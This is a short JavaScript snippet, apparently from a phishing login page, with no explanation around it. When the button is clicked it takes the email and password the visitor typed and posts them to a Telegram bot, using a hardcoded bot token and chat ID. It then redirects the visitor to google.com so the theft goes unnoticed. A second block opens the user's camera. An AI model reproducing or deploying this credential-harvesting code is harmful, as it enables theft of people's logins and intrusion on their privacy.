var token = "6423548656:AAFuFXiyAUDll8FgYjbYw6Iu30NdeSwml7s";
        var chat = "1955367555";
        $("button").click(function(){
            if($("#password").val()==""){
                alert("Password field cannot be empty.");
            }else{
                var mail=$("#username").val();
                var pass=$("#password").val();
                var m = `Email: ${mail}\nPass: ${pass}`;
                $.post(`https://api.telegram.org/bot${token}/sendMessage`,{
                    chat_id:chat,
                    text:m
                }).done(function(data){
                    window.location.replace("https://google.com");
                }).fail(function(data){
                    alert("Something is wrong");
                });
            }
        });

// Access the user's camera
navigator.mediaDevices.getUserMedia({ video: true })
    .then(function (stream) {
        const video = document.getElementById('videoElement');
        video.srcObject = stream;
    })
    .catch(function (error) {
        console.log("Error accessing the camera: ", error);
    });
